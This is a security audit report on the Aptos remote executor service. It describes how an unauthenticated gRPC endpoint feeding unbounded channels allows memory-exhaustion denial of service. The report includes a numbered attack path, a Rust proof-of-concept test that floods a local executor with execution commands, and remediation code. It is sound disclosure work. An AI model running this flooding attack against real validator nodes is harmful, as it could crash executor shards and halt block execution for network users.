# Audit Report

## Title
Unauthenticated Command Flooding Enables Memory Exhaustion DoS on Remote Executor Service

## Summary
The remote executor service exposes an unauthenticated GRPC endpoint that accepts execution commands from any network peer. Commands are queued in unbounded channels while being processed sequentially, allowing an attacker to flood the service with messages faster than they can be processed, causing unbounded memory growth and eventual Out-of-Memory (OOM) crashes that halt block execution.

## Finding Description
The remote executor architecture uses a GRPC server to receive execution commands from a coordinator. However, the implementation has multiple critical flaws that enable a memory exhaustion attack:

**1. Unbounded Channel Creation**

The `NetworkController` creates unbounded channels for both inbound and outbound messages: [1](#0-0) [2](#0-1) 

These unbounded channels have no capacity limits and will grow indefinitely when messages arrive faster than they can be consumed.

**2. No Authentication on GRPC Server**

The GRPC server accepts messages from any remote peer without authentication or authorization: [3](#0-2) 

Any network actor can send `execute_command_{shard_id}` messages to the executor service. The server routes messages to handlers with no rate limiting or validation.

**3. Sequential Block Processing**

The `ShardedExecutorService` processes execution commands one at a time in a synchronous loop: [4](#0-3) 

Each block execution involves expensive operations including BCS deserialization, state prefetching, and transaction execution. This sequential processing creates a natural bottleneck.

**4. Unsafe Channel Send Operations**

Messages are sent to handlers with `.unwrap()`, providing no error handling for potential failures: [5](#0-4) 

**Attack Path:**

1. Attacker identifies the GRPC endpoint address of an executor shard (typically exposed on network)
2. Attacker crafts valid `RemoteExecutionRequest::ExecuteBlock` messages (can be up to 80MB each based on `MAX_MESSAGE_SIZE`)
3. Attacker floods the GRPC endpoint with thousands of messages per second
4. Messages queue up in the unbounded `command_rx` channel while the executor processes them slowly (one block at a time)
5. The channel's memory footprint grows unbounded until the node exhausts available memory
6. The executor service crashes with OOM, halting all block execution for that shard
7. The sharded block executor cannot make progress without all shards, causing network-wide execution halt

This violates **Invariant #9 (Resource Limits)**: "All operations must respect gas, storage, and computational limits." The unbounded channel growth violates memory resource limits.

## Impact Explanation
This vulnerability qualifies as **High Severity** under the Aptos bug bounty program for the following reasons:

1. **Validator Node Slowdowns/Crashes** - Executor services experiencing memory pressure will slow down significantly before crashing with OOM errors
2. **API Crashes** - The GRPC service will become unresponsive and crash, affecting the validator's ability to process blocks
3. **Execution Halt** - When executor shards crash, the sharded block executor cannot complete execution, halting block production
4. **Network Availability** - If multiple shards are attacked simultaneously, the entire network's ability to execute transactions is compromised

The attack does not directly steal funds or break consensus safety, so it does not qualify as Critical. However, it significantly degrades network availability and validator node stability, meeting High severity criteria.

## Likelihood Explanation
This vulnerability is **highly likely** to be exploited in production:

**Attacker Requirements:**
- Network connectivity to executor service endpoints (typically reachable if services are deployed)
- Ability to craft valid GRPC messages (straightforward with public protobuf definitions)
- No authentication credentials or privileged access required

**Attack Complexity:**
- Low - A simple GRPC client can flood the endpoint
- No sophisticated timing or race conditions required
- Attack can be launched from a single machine

**Detection Difficulty:**
- Moderate - Memory growth is observable, but distinguishing malicious flooding from legitimate high load requires monitoring

The lack of authentication and unbounded channels make this vulnerability trivially exploitable by any adversary with network access to the executor service.

## Recommendation

Implement multiple defense layers:

**1. Add Bounded Channels**

Replace unbounded channels with bounded channels with appropriate capacity limits:

```rust
// In network_controller/mod.rs
pub fn create_outbound_channel(
    &mut self,
    remote_peer_addr: SocketAddr,
    message_type: String,
) -> Sender<Message> {
    // Use bounded channel with capacity limit
    let (outbound_sender, outbound_receiver) = bounded(1000); // Adjust capacity based on requirements

    self.outbound_handler
        .register_handler(message_type, remote_peer_addr, outbound_receiver);

    outbound_sender
}

pub fn create_inbound_channel(&mut self, message_type: String) -> Receiver<Message> {
    // Use bounded channel with capacity limit
    let (inbound_sender, inbound_receiver) = bounded(1000); // Adjust capacity based on requirements

    self.inbound_handler
        .lock()
        .unwrap()
        .register_handler(message_type, inbound_sender);

    inbound_receiver
}
```

**2. Implement Authentication**

Add mutual TLS or token-based authentication to the GRPC server:

```rust
// In grpc_network_service/mod.rs
async fn simple_msg_exchange(
    &self,
    request: Request<NetworkMessage>,
) -> Result<Response<Empty>, Status> {
    // Verify authentication token or TLS certificate
    if !self.verify_authenticated_peer(&request) {
        return Err(Status::unauthenticated("Invalid credentials"));
    }
    
    // ... rest of implementation
}
```

**3. Add Rate Limiting**

Implement per-peer rate limiting using a token bucket algorithm:

```rust
// Add rate limiter to GRPCNetworkMessageServiceServerWrapper
struct RateLimiter {
    tokens: Arc<Mutex<HashMap<SocketAddr, TokenBucket>>>,
}

impl RateLimiter {
    fn check_rate_limit(&self, peer: SocketAddr) -> Result<(), Status> {
        let mut tokens = self.tokens.lock().unwrap();
        let bucket = tokens.entry(peer).or_insert_with(TokenBucket::new);
        
        if !bucket.try_consume(1) {
            return Err(Status::resource_exhausted("Rate limit exceeded"));
        }
        Ok(())
    }
}
```

**4. Handle Channel Send Failures Gracefully**

Replace `.unwrap()` with proper error handling:

```rust
// In grpc_network_service/mod.rs line 107
if let Some(handler) = self.inbound_handlers.lock().unwrap().get(&message_type) {
    if let Err(e) = handler.try_send(msg) {
        error!("Failed to queue message: {:?}", e);
        return Err(Status::resource_exhausted("Command queue full"));
    }
}
```

**5. Add Monitoring and Alerts**

Implement metrics for channel depth and message processing rate to detect anomalies early.

## Proof of Concept

```rust
// PoC: Flood executor service with execution commands
// Add to execution/executor-service/src/lib.rs tests

#[cfg(test)]
mod security_tests {
    use super::*;
    use aptos_protos::remote_executor::v1::{
        network_message_service_client::NetworkMessageServiceClient,
        NetworkMessage,
    };
    use std::sync::Arc;
    use std::thread;
    use std::time::Duration;
    use tokio::runtime::Runtime;

    #[test]
    fn test_command_flooding_memory_exhaustion() {
        // Setup executor service on a test port
        let executor_addr = "127.0.0.1:52300".parse().unwrap();
        let coordinator_addr = "127.0.0.1:52301".parse().unwrap();
        
        let mut executor_service = ExecutorService::new(
            0, // shard_id
            4, // num_shards
            4, // num_threads
            executor_addr,
            coordinator_addr,
            vec![], // remote_shard_addresses
        );
        
        executor_service.start();
        
        // Allow service to start
        thread::sleep(Duration::from_millis(100));
        
        // Create attacker GRPC client
        let rt = Runtime::new().unwrap();
        let mut client = rt.block_on(async {
            let channel = tonic::transport::Endpoint::new(
                format!("http://{}", executor_addr)
            )
            .unwrap()
            .connect()
            .await
            .unwrap();
            
            NetworkMessageServiceClient::new(channel)
        });
        
        // Prepare large execution command message
        let execute_command = RemoteExecutionRequest::ExecuteBlock(
            ExecuteBlockCommand {
                sub_blocks: SubBlocksForShard::empty(), // Minimal valid payload
                concurrency_level: 1,
                onchain_config: BlockExecutorConfigFromOnchain::default(),
            }
        );
        
        let serialized = bcs::to_bytes(&execute_command).unwrap();
        
        // Flood the service with 10,000 messages
        println!("Starting flood attack...");
        let initial_memory = get_process_memory_mb();
        println!("Initial memory: {} MB", initial_memory);
        
        for i in 0..10000 {
            let message = NetworkMessage {
                message: serialized.clone(),
                message_type: "execute_command_0".to_string(),
            };
            
            rt.block_on(async {
                // Fire-and-forget, don't wait for response
                let _ = client.simple_msg_exchange(message).await;
            });
            
            if i % 1000 == 0 {
                let current_memory = get_process_memory_mb();
                println!("Sent {} messages, memory: {} MB (delta: +{} MB)", 
                    i, current_memory, current_memory - initial_memory);
            }
        }
        
        // Check memory growth
        thread::sleep(Duration::from_secs(1));
        let final_memory = get_process_memory_mb();
        let memory_increase = final_memory - initial_memory;
        
        println!("Final memory: {} MB (delta: +{} MB)", final_memory, memory_increase);
        
        // Assert significant memory growth (>500MB indicates unbounded queue)
        assert!(
            memory_increase > 500,
            "Expected significant memory growth from unbounded channel, got {} MB",
            memory_increase
        );
        
        executor_service.shutdown();
    }
    
    fn get_process_memory_mb() -> usize {
        // Use procfs or system APIs to get current process memory
        // Placeholder - actual implementation depends on platform
        use std::fs;
        let status = fs::read_to_string("/proc/self/status").unwrap_or_default();
        for line in status.lines() {
            if line.starts_with("VmRSS:") {
                let kb: usize = line
                    .split_whitespace()
                    .nth(1)
                    .and_then(|s| s.parse().ok())
                    .unwrap_or(0);
                return kb / 1024; // Convert KB to MB
            }
        }
        0
    }
}
```

**Expected Result:** The test demonstrates that flooding the executor service with messages causes unbounded memory growth (>500MB increase) as messages queue in the unbounded channel while being processed slowly. In production, this would eventually lead to OOM crashes.

## Notes

This vulnerability affects the experimental remote executor service architecture used for sharded block execution. The security issue stems from the design decision to use unbounded channels combined with an unauthenticated GRPC interface. While the legitimate coordinator self-regulates by waiting for execution results before sending new commands, the exposed GRPC endpoint allows any network peer to bypass this flow control and flood the service directly.

The fix requires a combination of authentication, bounded channels, and rate limiting to prevent resource exhaustion attacks while maintaining performance for legitimate use cases.

### Citations

**File:** secure/net/src/network_controller/mod.rs (L115-126)
```rust
    pub fn create_outbound_channel(
        &mut self,
        remote_peer_addr: SocketAddr,
        message_type: String,
    ) -> Sender<Message> {
        let (outbound_sender, outbound_receiver) = unbounded();

        self.outbound_handler
            .register_handler(message_type, remote_peer_addr, outbound_receiver);

        outbound_sender
    }
```

**File:** secure/net/src/network_controller/mod.rs (L128-137)
```rust
    pub fn create_inbound_channel(&mut self, message_type: String) -> Receiver<Message> {
        let (inbound_sender, inbound_receiver) = unbounded();

        self.inbound_handler
            .lock()
            .unwrap()
            .register_handler(message_type, inbound_sender);

        inbound_receiver
    }
```

**File:** secure/net/src/grpc_network_service/mod.rs (L91-116)
```rust
#[tonic::async_trait]
impl NetworkMessageService for GRPCNetworkMessageServiceServerWrapper {
    async fn simple_msg_exchange(
        &self,
        request: Request<NetworkMessage>,
    ) -> Result<Response<Empty>, Status> {
        let _timer = NETWORK_HANDLER_TIMER
            .with_label_values(&[&self.self_addr.to_string(), "inbound_msgs"])
            .start_timer();
        let remote_addr = request.remote_addr();
        let network_message = request.into_inner();
        let msg = Message::new(network_message.message);
        let message_type = MessageType::new(network_message.message_type);

        if let Some(handler) = self.inbound_handlers.lock().unwrap().get(&message_type) {
            // Send the message to the registered handler
            handler.send(msg).unwrap();
        } else {
            error!(
                "No handler registered for sender: {:?} and msg type {:?}",
                remote_addr, message_type
            );
        }
        Ok(Response::new(Empty {}))
    }
}
```

**File:** aptos-move/aptos-vm/src/sharded_block_executor/sharded_executor_service.rs (L215-260)
```rust
    pub fn start(&self) {
        trace!(
            "Shard starting, shard_id={}, num_shards={}.",
            self.shard_id,
            self.num_shards
        );
        let mut num_txns = 0;
        loop {
            let command = self.coordinator_client.receive_execute_command();
            match command {
                ExecutorShardCommand::ExecuteSubBlocks(
                    state_view,
                    transactions,
                    concurrency_level_per_shard,
                    onchain_config,
                ) => {
                    num_txns += transactions.num_txns();
                    trace!(
                        "Shard {} received ExecuteBlock command of block size {} ",
                        self.shard_id,
                        num_txns
                    );
                    let exe_timer = SHARDED_EXECUTOR_SERVICE_SECONDS
                        .timer_with(&[&self.shard_id.to_string(), "execute_block"]);
                    let ret = self.execute_block(
                        transactions,
                        state_view.as_ref(),
                        BlockExecutorConfig {
                            local: BlockExecutorLocalConfig::default_with_concurrency_level(
                                concurrency_level_per_shard,
                            ),
                            onchain: onchain_config,
                        },
                    );
                    drop(state_view);
                    drop(exe_timer);

                    let _result_tx_timer = SHARDED_EXECUTOR_SERVICE_SECONDS
                        .timer_with(&[&self.shard_id.to_string(), "result_tx"]);
                    self.coordinator_client.send_execution_result(ret);
                },
                ExecutorShardCommand::Stop => {
                    break;
                },
            }
        }
```
